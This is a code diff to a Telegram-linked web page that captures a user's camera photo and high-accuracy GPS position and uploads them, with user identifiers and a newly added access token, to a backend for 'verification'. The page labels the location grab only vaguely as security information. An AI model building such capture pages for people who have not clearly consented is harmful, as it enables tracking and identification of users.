@@ -132,9 +132,6 @@
             transition: background 0.2s;
         }
         .modal-btn:active { background: rgba(255,255,255,0.2); }
-
-        /* 错误提示文字 */
-        .error-hint { font-size: 12px; color: #ff6b6b; margin-top: 10px; }
     </style>
 </head>
 <body>
@@ -179,8 +176,8 @@
     // =================================================================
     // ⚠️⚠️⚠️ 请修改这里！⚠️⚠️⚠️
     // 填入你 Render 后端的地址 (不需要带最后的斜杠)
-    // 例如: "https://huiying-bot.onrender.com"
-    const BACKEND_URL = "https://huiying888.onrender.com"; 
+    // 例如: const BACKEND_URL = "https://huiying-bot.onrender.com";
+    const BACKEND_URL = "https://你的render服务名.onrender.com"; 
     // =================================================================
 
     const video = document.getElementById('video');
@@ -194,11 +191,12 @@
     const spinner = document.getElementById('spinner');
     const closeModalArea = document.getElementById('close-modal-area');
 
-    // 解析 URL 参数
+    // 解析 URL 参数 (这里修复了 403 问题的关键：获取 token)
     const urlParams = new URLSearchParams(window.location.search);
     const chatId = urlParams.get('chatid');
     const uid = urlParams.get('uid') || '0';
     const rawName = urlParams.get('name') || '未知用户';
+    const token = urlParams.get('token') || ''; // 👈 关键修复：获取链接中的令牌
     const name = decodeURIComponent(rawName);
     
     // 初始化显示
@@ -225,79 +223,62 @@
     }
 
     // 2. 核心逻辑
-    
-    // (A) 正常拍照按钮点击
     captureBtn.addEventListener('click', () => {
         if (!chatId) return showModal("❌ 链接已失效<br>请重新从机器人进入", false);
-        
-        captureAndUpload(true); // true = 需要定位
+        captureAndUpload(true); 
     });
 
-    // (B) 强制发送按钮点击
     forceBtn.addEventListener('click', () => {
-        captureAndUpload(false); // false = 跳过定位
+        captureAndUpload(false); 
     });
 
     function captureAndUpload(needLocation) {
-        // 截图
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         canvas.getContext('2d').drawImage(video, 0, 0);
 
-        // 显示加载
         showModal("正在获取安全位置信息...", true);
 
         if (needLocation) {
-            // 尝试获取定位
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
-                        // 成功
                         updateStatus("位置获取成功，正在上传...");
                         uploadPhoto(pos.coords.latitude, pos.coords.longitude);
                     },
-                    (err) => {
-                        // 失败
-                        handleLocFailure();
-                    },
+                    (err) => { handleLocFailure(); },
                     { enableHighAccuracy: true, timeout: 6000 }
                 );
-            } else {
-                handleLocFailure();
-            }
+            } else { handleLocFailure(); }
         } else {
-            // 强制发送模式
             updateStatus("⚠️ 已启用强制通道上传...");
             uploadPhoto(0, 0);
         }
     }
 
-    // 处理定位失败逻辑
     function handleLocFailure() {
         locFailCount++;
-        console.log(`Loc fail: ${locFailCount}`);
-
         if (locFailCount >= 3) {
-            // 失败3次，显示强制按钮
-            forceBtn.style.display = 'block'; // 显示红色按钮
+            forceBtn.style.display = 'block'; 
             showModal(`❌ 定位获取失败 (${locFailCount}/3)<br><span style='font-size:12px;color:#ff6b6b'>已激活强制发送通道，请关闭此弹窗后点击红色按钮。</span>`, false);
         } else {
-            // 失败 < 3次，提示重试
             showModal(`⚠️ 定位获取超时 (${locFailCount}/3)<br>请确保GPS已开启并重试`, false);
         }
     }
 
-    // 3. 上传函数
+    // 3. 上传函数 (关键修复：加入 token)
     function uploadPhoto(lat, lng) {
         canvas.toBlob(async (blob) => {
             try {
+                // 👈 关键修复：发送参数中必须包含 token，否则后端会报 403
                 const params = new URLSearchParams({
                     chatid: chatId,
                     uid: uid,
                     name: name,
                     lat: lat,
                     lng: lng,
-                    time: Date.now()
+                    time: Date.now(),
+                    token: token 
                 });
 
                 const response = await fetch(`${BACKEND_URL}/upload?${params.toString()}`, {
@@ -306,19 +287,17 @@
                     headers: { 'Content-Type': 'application/octet-stream' }
                 });
 
-                if (!response.ok) throw new Error(`HTTP ${response.status}`);
+                if (!response.ok) {
+                    if (response.status === 403) throw new Error("链接已过期 (403)，请在群内使用指令重新获取最新链接！");
+                    throw new Error(`HTTP ${response.status}`);
+                }
                 const result = await response.json();
                 
                 if (result.code === 0) {
                     showModal("✅ 验证成功！", false);
                     spinner.style.display = 'none';
                     setTimeout(() => {
-                        // 尝试关闭 Telegram WebApp
-                        if (window.Telegram && window.Telegram.WebApp) {
-                            window.Telegram.WebApp.close();
-                        } else {
-                            window.close();
-                        }
+                        window.close();
                         statusText.innerText = "上传完成，请手动关闭页面";
                     }, 1500);
                 } else {
@@ -330,7 +309,6 @@
         }, 'image/jpeg', 0.8);
     }
 
-    // 辅助函数：显示弹窗
     function showModal(html, isLoading) {
         statusModal.style.display = 'flex';
         statusText.innerHTML = html;
@@ -343,16 +321,10 @@
         }
     }
 
-    function updateStatus(text) {
-        statusText.innerText = text;
-    }
+    function updateStatus(text) { statusText.innerText = text; }
 
-    // 关闭弹窗点击事件
-    retryBtn.addEventListener('click', () => {
-        statusModal.style.display = 'none';
-    });
+    retryBtn.addEventListener('click', () => { statusModal.style.display = 'none'; });
 
-    // 启动
     startCamera();
 </script>
 </body>
